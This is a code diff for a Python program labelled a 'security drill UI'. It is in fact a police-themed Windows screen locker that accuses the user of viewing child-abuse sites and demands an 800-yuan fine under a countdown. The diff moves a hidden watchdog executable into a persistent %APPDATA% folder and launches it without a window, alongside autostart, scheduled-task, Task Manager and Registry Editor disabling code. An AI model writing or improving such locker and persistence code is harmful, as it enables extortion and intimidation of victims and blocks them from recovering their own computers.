@@ -3,7 +3,7 @@
 网络安全演练 UI - 终极单 EXE 版（内嵌 watchdog）
 ========================================================
 功能：
-    - 首次运行释放 watchdog.exe 到 %TEMP%，启动后退出
+    - 首次运行释放 watchdog.exe 到 %APPDATA%\SecurityDemo，启动后退出
     - watchdog 负责持续监控并拉起主程序
     - 主程序具备开机自启、计划任务、禁用任务管理器/注册表等粘性功能
     - 退出方式：Ctrl+Shift+Q 连续 3 次（ESC 已移除）
@@ -31,7 +31,6 @@ try:
     PIL_AVAILABLE = True
 except ImportError:
     PIL_AVAILABLE = False
-    # 启动时若未安装，在日志中提示（但日志系统尚未初始化，先忽略）
 # ============================================================
 # 日志系统（控制台仅显示启动信息，详细日志写入文件）
 # ============================================================
@@ -57,6 +56,7 @@ def init_log():
         # 若文件打开失败，降级为仅控制台
         print(f"[警告] 无法创建日志文件: {e}")
         _log_file = None
+
 def log(msg, console=None):
     """
     写入日志：
@@ -97,6 +97,7 @@ GREEN = "#008A00"
 def generate_demo_id():
     chars = string.ascii_uppercase + string.digits
     return "".join(random.choice(chars) for _ in range(10))
+
 def get_local_ip():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -109,18 +110,22 @@ def get_local_ip():
             return socket.gethostbyname(socket.gethostname())
         except:
             return "127.0.0.1"
+
 def get_hostname():
     try:
         return socket.gethostname()
     except:
         return "UNKNOWN-PC"
+
 def get_timezone():
     try:
         return datetime.now().astimezone().tzinfo.__class__.__name__
     except:
         return "Local Time"
+
 def get_current_time():
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
 def is_admin():
     """检测当前进程是否以管理员权限运行（仅Windows）"""
     try:
@@ -135,6 +140,7 @@ class WindowsPersistence:
     @staticmethod
     def is_windows():
         return sys.platform == "win32"
+
     @staticmethod
     def add_startup(exe_path):
         if not WindowsPersistence.is_windows():
@@ -151,6 +157,7 @@ class WindowsPersistence:
         except Exception as e:
             log(f"❌ 添加开机自启失败: {e}", console=False)
             return False
+
     @staticmethod
     def remove_startup():
         if not WindowsPersistence.is_windows():
@@ -165,6 +172,7 @@ class WindowsPersistence:
             log("✅ 已删除开机自启", console=False)
         except:
             pass
+
     @staticmethod
     def add_scheduled_task(exe_path):
         if not WindowsPersistence.is_windows():
@@ -177,6 +185,7 @@ class WindowsPersistence:
         except Exception as e:
             log(f"❌ 创建计划任务失败: {e}", console=False)
             return False
+
     @staticmethod
     def remove_scheduled_task():
         if not WindowsPersistence.is_windows():
@@ -186,6 +195,7 @@ class WindowsPersistence:
             log("✅ 已删除计划任务", console=False)
         except:
             pass
+
     @staticmethod
     def disable_taskmgr():
         if not WindowsPersistence.is_windows():
@@ -202,6 +212,7 @@ class WindowsPersistence:
         except Exception as e:
             log(f"❌ 禁用任务管理器失败: {e}", console=False)
             return False
+
     @staticmethod
     def enable_taskmgr():
         if not WindowsPersistence.is_windows():
@@ -216,6 +227,7 @@ class WindowsPersistence:
             log("✅ 已恢复任务管理器", console=False)
         except:
             pass
+
     @staticmethod
     def disable_regedit():
         if not WindowsPersistence.is_windows():
@@ -232,6 +244,7 @@ class WindowsPersistence:
         except Exception as e:
             log(f"❌ 禁用注册表编辑器失败: {e}", console=False)
             return False
+
     @staticmethod
     def enable_regedit():
         if not WindowsPersistence.is_windows():
@@ -247,42 +260,78 @@ class WindowsPersistence:
         except:
             pass
 # ============================================================
-# 释放并启动 watchdog
+# 【修复版】释放并启动 watchdog
 # ============================================================
 def release_and_launch_watchdog():
-    """释放内嵌的 watchdog.exe 到临时目录并启动，返回是否成功"""
+    """释放内嵌的 watchdog.exe 到 %APPDATA%\SecurityDemo 持久目录并启动，返回是否成功"""
     if os.environ.get('WATCHDOG_LAUNCHED') == '1':
+        log("检测WATCHDOG_LAUNCHED标记，跳过看门狗启动", console=False)
         return False
-    # 获取资源路径
+
+    # 获取内嵌资源路径
     if getattr(sys, 'frozen', False):
         base_path = sys._MEIPASS
     else:
         base_path = os.path.dirname(os.path.abspath(__file__))
+
     src_watchdog = os.path.join(base_path, 'watchdog.exe')
+    log(f"内嵌watchdog源路径: {src_watchdog}", console=False)
     if not os.path.exists(src_watchdog):
-        log("警告：未找到 watchdog.exe，跳过守护启动")
+        log("警告：未找到内嵌 watchdog.exe，跳过守护启动", console=False)
         return False
-    # 目标临时目录
-    temp_dir = os.path.join(tempfile.gettempdir(), 'SecurityDemoWatchdog')
-    os.makedirs(temp_dir, exist_ok=True)
-    target_watchdog = os.path.join(temp_dir, 'watchdog.exe')
-    # 复制文件
-    if not os.path.exists(target_watchdog) or os.path.getmtime(src_watchdog) > os.path.getmtime(target_watchdog):
-        shutil.copy2(src_watchdog, target_watchdog)
-    # 构造 watchdog 启动参数
-    current_exe = sys.executable
-    cmd = [target_watchdog, '--target', current_exe]
-    if '--persist' in sys.argv or '-p' in sys.argv:
-        cmd.append('--persist')
-    # 启动 watchdog（无窗口）
-    subprocess.Popen(
-        cmd,
-        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0,
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL
-    )
-    log("✅ watchdog 已启动，主进程退出", console=False)
-    return True
+
+    # 使用APPDATA持久目录，避免系统临时目录被清理
+    appdata = os.getenv("APPDATA")
+    if not appdata:
+        log("错误：无法获取APPDATA环境变量", console=False)
+        return False
+    target_dir = os.path.join(appdata, "SecurityDemo")
+    os.makedirs(target_dir, exist_ok=True)
+    target_watchdog = os.path.join(target_dir, "watchdog.exe")
+    log(f"watchdog目标释放路径: {target_watchdog}", console=False)
+
+    try:
+        src_size = os.path.getsize(src_watchdog)
+        # 判断是否需要覆盖：文件不存在 或者 文件大小不一致
+        need_copy = True
+        if os.path.exists(target_watchdog):
+            dst_size = os.path.getsize(target_watchdog)
+            if dst_size == src_size:
+                need_copy = False
+                log("watchdog本地文件已存在且大小一致，跳过复制", console=False)
+
+        if need_copy:
+            shutil.copy(src_watchdog, target_watchdog)
+            log("watchdog.exe复制完成", console=False)
+
+        # 二次校验复制结果
+        if not os.path.exists(target_watchdog):
+            log("错误：复制完成，但目标watchdog.exe不存在", console=False)
+            return False
+        if os.path.getsize(target_watchdog) != src_size:
+            log("错误：watchdog.exe复制后大小不匹配，文件损坏", console=False)
+            return False
+
+        # 构造 watchdog 启动参数
+        current_exe = sys.executable
+        cmd = [target_watchdog, '--target', current_exe]
+        if '--persist' in sys.argv or '-p' in sys.argv:
+            cmd.append('--persist')
+
+        # 启动 watchdog，无窗口
+        subprocess.Popen(
+            cmd,
+            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        log("✅ watchdog 已成功启动，主进程准备退出", console=False)
+        return True
+
+    except Exception as e:
+        log(f"❌ release_and_launch_watchdog 异常: {str(e)}", console=False)
+        return False
+
 # ============================================================
 # 获取资源文件路径（兼容开发环境和打包环境）
 # ============================================================
@@ -468,7 +517,7 @@ class SecurityDemoUI:
             "\n"
             "即恋童癖和虐待儿童内容的色情网站而被禁止。\n"
             "\n"
-            "您必须根据第0945-I3467361778号条例\n"
+            "您必须根据第0945‑I3467361778号条例\n"
             "将800元 罚款转入公安部罚款征收账户。\n"
             "\n"
             "支付罚款后，您的计算机将自动解锁，将不会对您提起刑事诉讼！"
@@ -496,7 +545,7 @@ class SecurityDemoUI:
                                         bg=WHITE, fg=DARK_RED)
         self.countdown_label.place(x=610, y=592)
         # 退出提示
-        tk.Label(body, text="第0945-I3467361778号罚款",
+        tk.Label(body, text="第0945‑I3467361778号罚款",
                  font=("Microsoft YaHei", 10), bg=WHITE, fg="#777777").place(x=0, y=645, width=1220)
     # ============================================================
     # 实时更新
@@ -511,6 +560,7 @@ class SecurityDemoUI:
         except Exception as e:
             log(f"更新失败: {e}", console=False)
         self.root.after(2000, self.update_live_info)
+
     def update_countdown(self):
         remaining = (self.countdown_end - datetime.now()).total_seconds()
         if remaining <= 0:
@@ -585,6 +635,7 @@ class SecurityDemoUI:
         WindowsPersistence.disable_taskmgr()
         WindowsPersistence.disable_regedit()
         log("✅ 所有粘性功能已应用", console=False)
+
     def cleanup_persistence(self):
         WindowsPersistence.remove_startup()
         WindowsPersistence.remove_scheduled_task()
@@ -603,6 +654,7 @@ class SecurityDemoUI:
         log(f"退出快捷键: {self.exit_count}/3", console=False)
         if self.exit_count >= 3:
             self.safe_exit()
+
     def safe_exit(self, event=None):
         log("正在安全退出...")
         if self.enable_persistence:
@@ -636,5 +688,6 @@ def main():
     enable_persistence = '--persist' in sys.argv or '-p' in sys.argv
     app = SecurityDemoUI(enable_persistence=enable_persistence)
     app.run()
+
 if __name__ == '__main__':
     main()
